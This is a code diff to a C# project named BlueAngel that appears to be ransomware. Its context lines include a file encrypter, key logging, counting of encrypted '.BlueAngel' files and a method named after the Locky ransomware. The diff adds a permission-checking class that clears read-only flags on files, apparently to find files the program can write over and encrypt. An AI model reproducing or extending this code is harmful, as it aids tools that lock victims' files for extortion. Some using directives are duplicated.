@@ -5,15 +5,121 @@ using System.Linq;
 using System.Reflection;
 using System.Text;
 using System.Threading.Tasks;
+using System.Security.AccessControl;
+using System.Security.Principal;
+using System.Management;
+using System.Security;
+using System.Security.AccessControl;
+using System.Security.Cryptography;
+using System.Security.Permissions;
+using System.Security.Principal;
+using System.Text;
+using System.Threading.Tasks;
 
 namespace BlueAngel
 {
+    // Get current user security status
+    public class CurrentUserSecurity
+    {
+        WindowsIdentity _currentUser;
+        WindowsPrincipal _currentPrincipal;
+
+        public CurrentUserSecurity()
+        {
+            _currentUser = WindowsIdentity.GetCurrent();
+            _currentPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
+        }
+
+        public bool HasAccess(DirectoryInfo directory, FileSystemRights right)
+        {
+            // Get the collection of authorization rules that apply to the directory.
+            AuthorizationRuleCollection acl = directory.GetAccessControl().GetAccessRules(true, true, typeof(SecurityIdentifier));
+            return HasFileOrDirectoryAccess(right, acl);
+        }
+
+        public bool HasAccess(FileInfo file, FileSystemRights right)
+        {
+            try
+            {
+                file.IsReadOnly = false;
+            }
+            catch (Exception)
+            {
+                // Nothing
+            }
+
+            try
+            {
+                // Get the collection of authorization rules that apply to the file.
+                AuthorizationRuleCollection acl = file.GetAccessControl().GetAccessRules(true, true, typeof(SecurityIdentifier));
+                return (HasFileOrDirectoryAccess(right, acl) && (!file.Attributes.HasFlag(FileAttributes.ReadOnly)));
+            }
+            catch (Exception)
+            {
+                return false;
+            }
+        }
+
+        private bool HasFileOrDirectoryAccess(FileSystemRights right, AuthorizationRuleCollection acl)
+        {
+            bool allow = false;
+            bool inheritedAllow = false;
+            bool inheritedDeny = false;
+
+            for (int i = 0; i < acl.Count; i++)
+            {
+                FileSystemAccessRule currentRule = (FileSystemAccessRule)acl[i];
+                // If the current rule applies to the current user.
+                if (_currentUser.User.Equals(currentRule.IdentityReference) || _currentPrincipal.IsInRole((SecurityIdentifier)currentRule.IdentityReference))
+                {
+
+                    if (currentRule.AccessControlType.Equals(AccessControlType.Deny))
+                    {
+                        if ((currentRule.FileSystemRights & right) == right)
+                        {
+                            if (currentRule.IsInherited)
+                            {
+                                inheritedDeny = true;
+                            }
+                            else
+                            {
+                                // Non inherited "deny" takes overall precedence.
+                                return false;
+                            }
+                        }
+                    }
+                    else if (currentRule.AccessControlType.Equals(AccessControlType.Allow))
+                    {
+                        if ((currentRule.FileSystemRights & right) == right)
+                        {
+                            if (currentRule.IsInherited)
+                            {
+                                inheritedAllow = true;
+                            }
+                            else
+                            {
+                                allow = true;
+                            }
+                        }
+                    }
+                }
+            }
+
+            if (allow)
+            {
+                // Non inherited "allow" takes precedence over inherited rules.
+                return true;
+            }
+            return inheritedAllow && !inheritedDeny;
+        }
+    }
     public class FileSystemOperation
     {
         /// <summary>
         /// File System Interactions
         /// </summary>
         /// 
+        BlueAngel.CurrentUserSecurity CurrentUser;
 
         EncryptionOperation FileEncrypter = new EncryptionOperation();
 
@@ -35,7 +141,6 @@ namespace BlueAngel
             }
 
         }
-
 
         public void LogKeyData(string privatekey, string publickey)
         {
@@ -65,12 +170,10 @@ namespace BlueAngel
             }
         }
 
-
         public void startstopFileDump()
         {
 
         }
-
 
         public FileInfo[] GetLockyFileCount(string path)
         {
@@ -78,9 +181,7 @@ namespace BlueAngel
             FileInfo[] Files = d.GetFiles("*.BlueAngel"); //Getting BlueAngel files
             return Files;
         }
-
        
-
         public FileInfo[] GetTXTFileCount (string path)
         {
             DirectoryInfo d = new DirectoryInfo(path);
@@ -175,4 +276,8 @@ namespace BlueAngel
         }
 
     }
+
+
+
+
 }
